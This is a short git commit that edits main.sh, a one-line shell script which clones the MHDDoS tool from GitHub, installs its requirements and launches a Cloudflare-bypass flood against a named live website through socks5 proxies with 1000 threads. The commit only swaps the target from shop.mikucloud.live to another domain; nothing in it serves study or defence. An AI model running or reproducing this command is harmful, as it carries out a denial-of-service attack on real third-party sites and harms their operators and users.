e34a5b325229589f1b4ac7edafc4b62b51d7e039
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-05-16 09:08:05 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'http://shop.mikucloud.live'  5  1000 socks5.txt  100 6000
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://xn--fiqs8sa8vl54erq8d.com'  1  1000 socks5.txt  100 6000
